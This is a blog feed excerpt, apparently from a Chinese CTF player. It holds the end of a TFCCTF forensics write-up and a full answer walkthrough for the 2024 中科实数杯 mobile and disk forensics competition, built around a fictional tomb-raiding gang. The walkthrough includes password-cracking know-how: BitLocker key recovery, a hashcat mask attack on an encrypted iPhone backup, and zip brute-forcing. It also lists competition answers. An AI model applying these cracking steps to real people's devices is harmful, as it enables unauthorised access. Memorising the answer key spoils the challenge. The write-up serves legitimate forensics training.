src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040047115.png" alt="image-20240804004719038"></p><p>右键<code>caca</code> 点击转到入口点 就可以查看到主函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040047399.png" alt="image-20240804004758268"></p><p>一个C#的程序  主要功能就是将一个字符串的每个字符的ascii码值都+2 再转字符输出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040048567.png" alt="image-20240804004832455"></p><p>我们现在就找他对应的这个密文在哪里  直接在源码里面搜<code>caca.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040050633.png" alt="image-20240804005016556"></p><p>找到密文</p><pre><code>VHEEVH&#125;x3uwcnad6u3eac3pvaj6tf</code></pre><p>写个脚本 跑出结果 后面补个<code>&#125;</code>就行 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408040051830.png" alt="image-20240804005102737"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TFCCTF2024之forensics&quot;&gt;&lt;a href=&quot;#TFCCTF2024之forensics&quot; class=&quot;headerlink&quot; title=&quot;TFCCTF2024之forensics&quot;&gt;&lt;/a&gt;TFCCTF2024之forensics&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2024中科实数杯wp</title>
    <link href="http://w3nx1z1.github.io/2024/07/26/2024%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AFwp/"/>
    <id>http://w3nx1z1.github.io/2024/07/26/2024%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AFwp/</id>
    <published>2024-07-26T02:21:37.095Z</published>
    <updated>2024-07-30T13:22:48.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024中科实数杯wp"><a href="#2024中科实数杯wp" class="headerlink" title="2024中科实数杯wp"></a>2024中科实数杯wp</h1><h2 id="鉴定材料"><a href="#鉴定材料" class="headerlink" title="鉴定材料"></a>鉴定材料</h2><pre><code>1、犯罪嫌疑人张老四的 iphone 手机备份一个；2、犯罪嫌疑人王胖子的安卓手机备份一个；3、犯罪窝点起获的 windows 笔记本电脑 A 镜像一个；4、犯罪窝点起获的 macbook 笔记本电脑 B 镜像一个；5、犯罪窝点笔记本电脑 A 内存镜像一份；6、后期归案的犯罪嫌疑人大金牙工作安卓手机备份一个；7、犯罪窝点的 u 盘镜像一个；8、后期归案的犯罪嫌疑人眼镜仔工作 iphone 手机备份一个</code></pre><h2 id="基本案情"><a href="#基本案情" class="headerlink" title="基本案情"></a>基本案情</h2><pre><code>  山西省公安机关接到线报，有一伙人长期从事盗墓和贩售文物活动，形成了一条龙的犯罪链条。经过数月侦察，警方掌握了该团伙的核心成员信息，并成功在一次交易中将多名嫌疑人抓获，现场扣押了大量文物及嫌疑人手机，并在突击审讯后在其老巢起获了多台笔记本电脑及电子存储设备。现需要对这些设备进行全面取证分析，以获得更多犯罪证据，彻底摧毁这一犯罪网络。</code></pre><h2 id="分析说明-WP部分"><a href="#分析说明-WP部分" class="headerlink" title="分析说明(WP部分)"></a>分析说明(WP部分)</h2><h3 id="1、检材-1-的手机序列号是？（1-分）"><a href="#1、检材-1-的手机序列号是？（1-分）" class="headerlink" title="1、检材 1-的手机序列号是？（1 分）"></a>1、检材 1-的手机序列号是？（1 分）</h3><pre><code>C39QTS9JGRX5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261036616.png" alt="image-20240715225805849"></p><h3 id="2、检材-1-的备份时间是？（格式：yyyy-mm-dd-HH-mm-ss）（2分）"><a href="#2、检材-1-的备份时间是？（格式：yyyy-mm-dd-HH-mm-ss）（2分）" class="headerlink" title="2、检材 1-的备份时间是？（格式：yyyy-mm-dd HH:mm:ss）（2分）"></a>2、检材 1-的备份时间是？（格式：yyyy-mm-dd HH:mm:ss）（2分）</h3><pre><code>2024-07-11 02:09:02</code></pre><p>接上题图</p><h3 id="3、检材-1-最近使用的-APP-是？（应用名称）（1-分）"><a href="#3、检材-1-最近使用的-APP-是？（应用名称）（1-分）" class="headerlink" title="3、检材 1-最近使用的 APP 是？（应用名称）（1 分）"></a>3、检材 1-最近使用的 APP 是？（应用名称）（1 分）</h3><pre><code>铛铛</code></pre><p>分析应用授权日志 发现最近的授权记录应用是铛铛</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261100613.png" alt="image-20240715225805849"></p><h3 id="4、检材-2-即时聊天工具有哪些？（2-分）"><a href="#4、检材-2-即时聊天工具有哪些？（2-分）" class="headerlink" title="4、检材 2-即时聊天工具有哪些？（2 分）"></a>4、检材 2-即时聊天工具有哪些？（2 分）</h3><pre><code>城信、铛铛、QQ、MOMO陌陌</code></pre><p>直接查看apk列表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261106418.png" alt="image-20240715225805849"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261106520.png" alt="image-20240715225805849"></p><p>搜了一下铛铛和城信 发现也是即时通讯app</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261107456.png" alt="image-20240715225805849"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261107649.png" alt="image-20240715225805849"></p><h3 id="5、检材-2-盗墓团伙之间的通讯-APP-版本是多少？（格式：x-x-x）"><a href="#5、检材-2-盗墓团伙之间的通讯-APP-版本是多少？（格式：x-x-x）" class="headerlink" title="5、检材 2-盗墓团伙之间的通讯 APP 版本是多少？（格式：x.x.x）"></a>5、检材 2-盗墓团伙之间的通讯 APP 版本是多少？（格式：x.x.x）</h3><pre><code>3.0.36</code></pre><p>直接从分析结果中看到的QQ和陌陌中并没有关于盗墓的聊天记录 那就手动分析一下其他两个通讯app 先看铛铛</p><p>找到聊天记录数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261720314.png" alt="image-20240715225805849"></p><p>导出 使用navicat分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261720094.png" alt="image-20240715225805849"></p><p>发现聊天内容与盗墓有关 再查看铛铛的应用版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407261724016.png" alt="image-20240715225805849"></p><h3 id="6、检材-2-盗墓团伙抱怨的工具有哪些（2-分）"><a href="#6、检材-2-盗墓团伙抱怨的工具有哪些（2-分）" class="headerlink" title="6、检材 2-盗墓团伙抱怨的工具有哪些（2 分）"></a>6、检材 2-盗墓团伙抱怨的工具有哪些（2 分）</h3><pre><code>铲子、绳子、电筒、指南针</code></pre><p>接上题图 根据聊天内容语境 可以判断 抱怨的工具有铲子 绳子 电筒 指南针</p><h3 id="7-7、检材-2-盗墓团伙之间的通讯-APP-证书指纹-SHA256-值是多少？（格式：xx-xx…或-xxxx…）（5-分）"><a href="#7-7、检材-2-盗墓团伙之间的通讯-APP-证书指纹-SHA256-值是多少？（格式：xx-xx…或-xxxx…）（5-分）" class="headerlink" title="7.7、检材 2-盗墓团伙之间的通讯 APP 证书指纹 SHA256 值是多少？（格式：xx:xx…或 xxxx…）（5 分）"></a>7.7、检材 2-盗墓团伙之间的通讯 APP 证书指纹 SHA256 值是多少？（格式：xx:xx…或 xxxx…）（5 分）</h3><pre><code>f6605feeee5844b40d457652f0fe8a54ae237f745ff82131bafd196cfa3e17af</code></pre><p>直接在文件系统中找到铛铛的apk文件 导出后使用雷电进行分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262245440.png" alt="image-20240726224515201"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262247997.png" alt="image-20240726224757683"></p><h3 id="8、检材-3-硬盘的-MD5-值（1-分）"><a href="#8、检材-3-硬盘的-MD5-值（1-分）" class="headerlink" title="8、检材 3-硬盘的 MD5 值（1 分）"></a>8、检材 3-硬盘的 MD5 值（1 分）</h3><pre><code>01A2CDF623353043053ED37A7519265B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262319174.png" alt="image-20240726231908114"></p><h3 id="9、检材-3-硬盘系统分区的起始位置（1-分）"><a href="#9、检材-3-硬盘系统分区的起始位置（1-分）" class="headerlink" title="9、检材 3-硬盘系统分区的起始位置（1 分）"></a>9、检材 3-硬盘系统分区的起始位置（1 分）</h3><pre><code>344,981,504</code></pre><p>检材3 windows计算机的C盘存在bitlocker加密 这里提供几种解密方法</p><h4 id="一、取证大师小程序"><a href="#一、取证大师小程序" class="headerlink" title="一、取证大师小程序"></a>一、取证大师小程序</h4><p>因为这里给我们提供了计算机的内存镜像 取证大师内存取证小程序可以直接从里面提取出bitlocker解密密钥文件 但是这个缺点是这个密钥文件只能在取证大师中使用 火眼是用不了的</p><p>路径是</p><pre><code>E:\取证大师\FMP\Tools\FmScript\Scripts\Extends\内存镜像解析工具-专业版\x64\result\DC8D8739C6803B6407505CACA7D45FBB.KeyFile</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262255040.png" alt="image-20240726225542949"></p><p>直接在取证大师中导入就可以使用</p><h4 id="二、passwarekit爆破密钥"><a href="#二、passwarekit爆破密钥" class="headerlink" title="二、passwarekit爆破密钥"></a>二、passwarekit爆破密钥</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262256660.png" alt="image-20240726225639580"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262257624.png" alt="image-20240726225713549"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262256656.png" alt="image-20240726225618512"></p><p>爆破出恢复密钥是</p><pre><code>010461-617507-553498-499752-253286-356334-124773-180169</code></pre><p>将这个恢复密钥导入到火眼或者取证大师中都可以进行bitlocker解密</p><h4 id="三、生成去掉bitlocker加密的镜像"><a href="#三、生成去掉bitlocker加密的镜像" class="headerlink" title="三、生成去掉bitlocker加密的镜像"></a>三、生成去掉bitlocker加密的镜像</h4><p>在使用passwarekit爆破结束之后 会生成一个C盘已经去掉bitlocker加密的镜像 也可以在拿这个镜像进行取证分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262258338.png" alt="image-20240726225834250"></p><p>在解开bitlocker加密之后 就可以对检材3进行正常的一套分析 </p><p>系统分区的起始位置 其实问的就是C盘的起始位置 也有很多方法</p><h4 id="火眼"><a href="#火眼" class="headerlink" title="火眼"></a>火眼</h4><p>火眼里面提供的是起始扇区 记得要乘上512</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262308997.png" alt="image-20240726230803877"></p><h4 id="取证大师"><a href="#取证大师" class="headerlink" title="取证大师"></a>取证大师</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262309166.png" alt="image-20240726230927045"></p><h4 id="证据文件硬盘信息小程序"><a href="#证据文件硬盘信息小程序" class="headerlink" title="证据文件硬盘信息小程序"></a>证据文件硬盘信息小程序</h4><p>这是取证大师中的小程序 比较方便 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262310567.png" alt="image-20240726231021502"></p><h3 id="10、检材-3-系统的当前版本是多少（1-分）"><a href="#10、检材-3-系统的当前版本是多少（1-分）" class="headerlink" title="10、检材 3-系统的当前版本是多少（1 分）"></a>10、检材 3-系统的当前版本是多少（1 分）</h3><pre><code>10</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262314344.png" alt="image-20240726231408284"></p><h3 id="11、检材-3-Edge-浏览器最后一次搜索过的关键词是什么（1-分）"><a href="#11、检材-3-Edge-浏览器最后一次搜索过的关键词是什么（1-分）" class="headerlink" title="11、检材 3-Edge 浏览器最后一次搜索过的关键词是什么（1 分）"></a>11、检材 3-Edge 浏览器最后一次搜索过的关键词是什么（1 分）</h3><pre><code>狼眼手电</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262316369.png" alt="image-20240726231657231"></p><h3 id="12、检材-3-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站-URL（1-分）"><a href="#12、检材-3-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站-URL（1-分）" class="headerlink" title="12、检材 3-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站 URL（1 分）"></a>12、检材 3-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站 URL（1 分）</h3><pre><code>https://baijiahao.baidu.com/s?id=1599783184726705131</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262318598.png" alt="image-20240726231822487"></p><h3 id="13、检材-3-主用户的-NT-密码哈希值（2-分）"><a href="#13、检材-3-主用户的-NT-密码哈希值（2-分）" class="headerlink" title="13、检材 3-主用户的 NT 密码哈希值（2 分）"></a>13、检材 3-主用户的 NT 密码哈希值（2 分）</h3><pre><code>a0bad269b8d49ccf481513f9875be4c7</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262319522.png" alt="image-20240726231947389"></p><h3 id="14、检材-4-Mac-OS-的版本号（格式：x-x-x）（1-分）"><a href="#14、检材-4-Mac-OS-的版本号（格式：x-x-x）（1-分）" class="headerlink" title="14、检材 4-Mac OS 的版本号（格式：x.x.x）（1 分）"></a>14、检材 4-Mac OS 的版本号（格式：x.x.x）（1 分）</h3><pre><code>12.7.5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262320049.png" alt="image-20240726232033922"></p><h3 id="15、检材-4-加密货币软件的名字（1-分）"><a href="#15、检材-4-加密货币软件的名字（1-分）" class="headerlink" title="15、检材 4-加密货币软件的名字（1 分）"></a>15、检材 4-加密货币软件的名字（1 分）</h3><pre><code>OKX</code></pre><p>对检材4macbook 笔记本进行仿真  看到桌面有一个OKX网页 访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407270024871.png" alt="image-20240727002455686"></p><h3 id="16、检材-4-Safari-浏览器最后一次搜索过的关键词是什么（1-分）"><a href="#16、检材-4-Safari-浏览器最后一次搜索过的关键词是什么（1-分）" class="headerlink" title="16、检材 4-Safari 浏览器最后一次搜索过的关键词是什么（1 分）"></a>16、检材 4-Safari 浏览器最后一次搜索过的关键词是什么（1 分）</h3><pre><code>洛阳铲</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407270031737.png" alt="image-20240727003105510"></p><h3 id="17、检材-4-MacBook-pro-最后一次访问的文件名（2-分）"><a href="#17、检材-4-MacBook-pro-最后一次访问的文件名（2-分）" class="headerlink" title="17、检材 4-MacBook pro 最后一次访问的文件名（2 分）"></a>17、检材 4-MacBook pro 最后一次访问的文件名（2 分）</h3><pre><code>提示.doc</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301726152.png" alt="image-20240730172608015"></p><h3 id="18、检材-4-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站（2-分）"><a href="#18、检材-4-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站（2-分）" class="headerlink" title="18、检材 4-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站（2 分）"></a>18、检材 4-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站（2 分）</h3><pre><code>文物流转聊天室.html</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280133161.png" alt="image-20240728013346048"></p><h3 id="19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3-分）"><a href="#19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3-分）" class="headerlink" title="19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3 分）"></a>19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3 分）</h3><pre><code>20240712</code></pre><p>从检材一的铛铛聊天数据库中找到一段关于盗墓的聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280150051.png" alt="image-20240728015045900"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280150195.png" alt="image-20240728015056082"></p><h3 id="20、盗墓团伙最近一次盗的墓名是？（3-分）"><a href="#20、盗墓团伙最近一次盗的墓名是？（3-分）" class="headerlink" title="20、盗墓团伙最近一次盗的墓名是？（3 分）"></a>20、盗墓团伙最近一次盗的墓名是？（3 分）</h3><pre><code>王墓坡</code></pre><p>接上题图</p><h3 id="21、大金牙的手机号码是什么？（5-分）"><a href="#21、大金牙的手机号码是什么？（5-分）" class="headerlink" title="21、大金牙的手机号码是什么？（5 分）"></a>21、大金牙的手机号码是什么？（5 分）</h3><pre><code>13913913916</code></pre><p>在检材四分析出的<code>文物中转站聊天室.html</code>中找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280152000.png" alt="image-20240728015221860"></p><h3 id="22、检材-7-虚拟货币钱包的地址（5-分）"><a href="#22、检材-7-虚拟货币钱包的地址（5-分）" class="headerlink" title="22、检材 7-虚拟货币钱包的地址（5 分）"></a>22、检材 7-虚拟货币钱包的地址（5 分）</h3><pre><code>1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2</code></pre><p>检材七是U盘镜像 根据在检材四找到的<code>提示.doc</code>的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280153950.png" alt="image-20240728015351750"></p><p>那直接取证大师原始数据搜索即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291958596.png" alt="image-20240729195801508"></p><h3 id="23、检材-7-虚拟货币助记词（5-分）"><a href="#23、检材-7-虚拟货币助记词（5-分）" class="headerlink" title="23、检材 7-虚拟货币助记词（5 分）"></a>23、检材 7-虚拟货币助记词（5 分）</h3><pre><code>love can play games tomorrow money</code></pre><p>直接分析U盘就可以找到一个<code>助记词.zip</code> 发现有密码 直接拿来爆破就好</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291755827.png" alt="image-20240729175514677"></p><p>解压就有助记词</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291755088.png" alt="image-20240729175546038"></p><h3 id="24、检材-3-系统登陆密码（5-分）"><a href="#24、检材-3-系统登陆密码（5-分）" class="headerlink" title="24、检材 3-系统登陆密码（5 分）"></a>24、检材 3-系统登陆密码（5 分）</h3><pre><code>20242024</code></pre><p>检材三是windows镜像 在拿进去分析的时候密码就跑出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291756448.png" alt="image-20240729175644389"></p><h3 id="25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）"><a href="#25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）" class="headerlink" title="25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）"></a>25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）</h3><pre><code>James David</code></pre><p>这种一般还是要分析聊天记录 现在还没有分析的就是检材6的安卓手机备份  看分析结果有Skype Potato 微信 Telegram 在Telegram中找到关于文物贩卖的聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292105600.png" alt="image-20240729210534433"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292105829.png" alt="image-20240729210544690"></p><p>一共是两个人</p><h3 id="26、该案件中，文物贩子与买家的通讯-APP-的包名是？（3-分）"><a href="#26、该案件中，文物贩子与买家的通讯-APP-的包名是？（3-分）" class="headerlink" title="26、该案件中，文物贩子与买家的通讯 APP 的包名是？（3 分）"></a>26、该案件中，文物贩子与买家的通讯 APP 的包名是？（3 分）</h3><pre><code>org.telegram.messenger.web</code></pre><p>接上题 应该是Telegram 找到对应的报包名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292107873.png" alt="image-20240729210701743"></p><h3 id="27、大金牙的真实姓名可能是？（3-分）"><a href="#27、大金牙的真实姓名可能是？（3-分）" class="headerlink" title="27、大金牙的真实姓名可能是？（3 分）"></a>27、大金牙的真实姓名可能是？（3 分）</h3><pre><code>冀璐晟</code></pre><p>由第21题可知大金牙手机号为13913913916直接在通讯录里面找</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300022846.png" alt="image-20240730002217690"></p><h3 id="28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3-分）"><a href="#28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3-分）" class="headerlink" title="28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3 分）"></a>28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3 分）</h3><pre><code>MATIC</code></pre><p>这里可以在检材4中找到嵌套证据苹果手机备份文件 导出分析 发现需要密码 爆破<code>Manifest.plist</code>得到密码<code>364289</code> 填入密码继续分析</p><p> 由于我的显卡不是很好 这里选择使用hashcat进行爆破 先获取文件密码的哈希值 将结果保存在hash.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301244953.png" alt="image-20240730002524380"></p><p>9分钟将6位纯数字密码爆破出 还是非常快的 </p><pre><code>./hashcat -m 14800 ./hash.txt -a 3 &#39;?d?d?d?d?d?d&#39;# 从获取到的哈希值中可知 这个苹果手机备份的ios版本大于10 所以这里-m 后面的参数是14800 如果是小于10的版本 则使用14700</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301336536.png" alt="image-20240730002524380"></p><p>在火眼分析结果的微信聊天记录中 我们找到眼镜仔和大金牙交易过程中提到了使用的货币</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301028179.png" alt="image-20240730002524380"></p><h3 id="29、该案件中，谁是文物贩子？（3-分）"><a href="#29、该案件中，谁是文物贩子？（3-分）" class="headerlink" title="29、该案件中，谁是文物贩子？（3 分）"></a>29、该案件中，谁是文物贩子？（3 分）</h3><pre><code>大金牙</code></pre><p>根据上面Telegram的聊天记录 得知是大金牙</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300025504.png" alt="image-20240730002524380"></p><h3 id="30、盗墓团伙最近一次交易的文物有几个？（5分）"><a href="#30、盗墓团伙最近一次交易的文物有几个？（5分）" class="headerlink" title="30、盗墓团伙最近一次交易的文物有几个？（5分）"></a>30、盗墓团伙最近一次交易的文物有几个？（5分）</h3><pre><code>5</code></pre><p><font color='red'>这里的需要注意这个交易是指以盗墓团伙与大金牙对文物的一手交易 在盗墓团伙中 眼镜仔应该是负责销赃 而不是后面在检材6的Telegram聊天记录中 我们找到的大金牙找到James还有David的对文物的第二手交易</font></p><p>也是读聊天记录 传了一个有要交易的文物图片的压缩包 解压密码在上面的聊天记录里面<code>yjz_18022462024</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301104719.png" alt="image-20240730002524380"></p><p>解压后 看到有7张图片<img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301105057.png" alt="image-20240730002524380"></p><p>仔细查看 可以发现 图2和图4是一个文物 图6和图7是一个文物</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301107021.png" alt="image-20240730002524380"></p><p>因此 一共交易了5个文物</p><h3 id="31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）"><a href="#31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）" class="headerlink" title="31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）"></a>31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）</h3><pre><code>188000MATIC</code></pre><p>聊天记录中 大金牙一共从眼镜仔中买了两批货 都使用虚拟币MATIC进行交易 共18.8W MATIC</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301113942.png" alt="image-20240730002524380"></p><h3 id="32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）"><a href="#32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）" class="headerlink" title="32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）"></a>32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）</h3><pre><code>68600ETH</code></pre><p>在我们分析检材6的Telegram聊天记录时可以发现 大金牙对买家说 交易文物的价格都在发送的文物图片上 但是我们找到原图片 并没有发现所说的价格 结合下面第40题提到检材6安卓手机上安装的隐写工具 猜测价格是使用隐写工具进行了隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301223276.png" alt="image-20240730002524380"></p><p>先从第一个隐写工具开始尝试 从文件系统中找到其对应的apk文件 导出 安装到雷电模拟器上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114202.png" alt="image-20240730011438813"></p><p>点击<code>Reveal the Message</code> 查看图片中的信息 就可以提取到隐写的价格信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301341891.png" alt="image-20240730011438813"></p><p>找到<code>SX-WW-202407001</code>这张图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301340515.png" alt="image-20240730011438813"></p><p>因此文物名为“SX-WW-202407001”价格是68600ETH</p><h3 id="33、盗墓地点的-GPS-经纬度（格式：经度-xx-xx-xx，纬度-xx-xx-xx-（1-分）"><a href="#33、盗墓地点的-GPS-经纬度（格式：经度-xx-xx-xx，纬度-xx-xx-xx-（1-分）" class="headerlink" title="33、盗墓地点的 GPS 经纬度（格式：经度 xx,xx,xx，纬度 xx,xx,xx)（1 分）"></a>33、盗墓地点的 GPS 经纬度（格式：经度 xx,xx,xx，纬度 xx,xx,xx)（1 分）</h3><pre><code>112,36,57, 27,50,45</code></pre><p>提到盗墓地点的聊天记录在检材1的铛铛数据库中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301655845.png" alt="image-20240730165544342"></p><p>但是提到的这三张图片在检材二中找到 在建材二中存在一个back_image.zip 解压之后就是三张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707890.png" alt="image-20240730170314565"></p><p>其中盗墓地点是image-1.jpg 所在地经纬度直接看属性</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707997.png" alt="image-20240730170400322"></p><h3 id="34、盗墓前集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）"><a href="#34、盗墓前集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）" class="headerlink" title="34、盗墓前集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）"></a>34、盗墓前集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）</h3><pre><code>112,36,53, 37,50,45</code></pre><p>盗墓前集合地是image-2.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707489.png" alt="image-20240730170509522"></p><h3 id="35、盗墓后集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）"><a href="#35、盗墓后集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）" class="headerlink" title="35、盗墓后集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）"></a>35、盗墓后集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）</h3><pre><code>112,36,52, 37,47,51</code></pre><p>盗墓后集合地是image-3.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301706928.png" alt="image-20240730170609878"></p><h3 id="36-检材-6中最近一次呼入的号码是？"><a href="#36-检材-6中最近一次呼入的号码是？" class="headerlink" title="36.检材 6中最近一次呼入的号码是？"></a>36.<strong>检材</strong> 6中最近一次呼入的号码是？</h3><pre><code>9528207</code></pre><p>这里要区分一个点 火眼分析结果中 会把呼入但是未接通的通话记录标记为未接 但是就算是没有接通 也是产生了呼入这个动作 </p><p><font color='red'>为了方便理解 我们可以把呼入呼出认为是一种动作 未接接通和拒接认为是状态 这里是需要我们找最近一次呼入这个动作的号码</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301025559.png" alt="image-20240730102559303"></p><h3 id="37、检材6-浏览器第一次搜索的内容是？（1分）"><a href="#37、检材6-浏览器第一次搜索的内容是？（1分）" class="headerlink" title="37、检材6-浏览器第一次搜索的内容是？（1分）"></a>37、检材6-浏览器第一次搜索的内容是？（1分）</h3><pre><code>隐写工具</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300112928.png" alt="image-20240730011205661"></p><h3 id="38、检材6-手机所使用的翻墙APP是？（1分）"><a href="#38、检材6-手机所使用的翻墙APP是？（1分）" class="headerlink" title="38、检材6-手机所使用的翻墙APP是？（1分）"></a>38、检材6-手机所使用的翻墙APP是？（1分）</h3><pre><code>Clash</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300112647.png" alt="image-20240730011243363"></p><h3 id="39、检材6-翻墙APP所使用的订阅地址是？（1分）"><a href="#39、检材6-翻墙APP所使用的订阅地址是？（1分）" class="headerlink" title="39、检材6-翻墙APP所使用的订阅地址是？（1分）"></a>39、检材6-翻墙APP所使用的订阅地址是？（1分）</h3><pre><code>https://miaomiao.xn--7rs48z0nlr6hc8cqz4a.com/api/v1/client/subscribe?token=1357e1cbda597141d15ae689b3d470d7</code></pre><p><img 